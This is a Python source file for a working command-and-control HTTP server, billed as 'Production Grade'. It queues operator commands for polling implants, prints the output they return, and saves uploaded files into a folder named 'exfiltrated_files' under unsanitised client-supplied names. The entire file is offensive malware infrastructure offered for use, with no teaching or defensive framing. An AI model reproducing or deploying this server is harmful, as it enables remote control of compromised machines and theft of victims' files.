# =======================
# server.py (Production Grade)
# =======================
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
import queue
import os
import cgi

HOST = '0.0.0.0'
PORT = 8000
UPLOAD_DIR = "exfiltrated_files"
os.makedirs(UPLOAD_DIR, exist_ok=True)

command_queue = queue.Queue()
output_queue = queue.Queue()

class C2Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if not command_queue.empty():
            cmd = command_queue.get()
        else:
            cmd = ""
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(cmd.encode())

    def do_POST(self):
        if self.path == "/upload":
            ctype, pdict = cgi.parse_header(self.headers['content-type'])
            if ctype == 'multipart/form-data':
                pdict['boundary'] = bytes(pdict['boundary'], "utf-8")
                pdict['CONTENT-LENGTH'] = int(self.headers['Content-Length'])
                fields = cgi.parse_multipart(self.rfile, pdict)
                file_field = fields.get("file")
                if file_field:
                    file_data = file_field[0]
                    filename = self.headers.get('X-Filename', 'uploaded_file')
                    with open(os.path.join(UPLOAD_DIR, filename), "wb") as f:
                        f.write(file_data)
                    self.send_response(200)
                    self.end_headers()
                    return

        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        output = post_data.decode(errors='ignore')
        output_queue.put(output)
        self.send_response(200)
        self.end_headers()

        print("[+] Client Response:\n" + output + "\n")

def start_server():
    server = HTTPServer((HOST, PORT), C2Handler)
    print(f"[+] C2 HTTP server running on {HOST}:{PORT}\n")
    server.serve_forever()

def cli():
    while True:
        cmd = input("[C2] > ")
        if cmd.strip().lower() == "exit":
            print("[-] Exiting...")
            break
        command_queue.put(cmd)

# Start HTTP server thread
threading.Thread(target=start_server, daemon=True).start()
cli()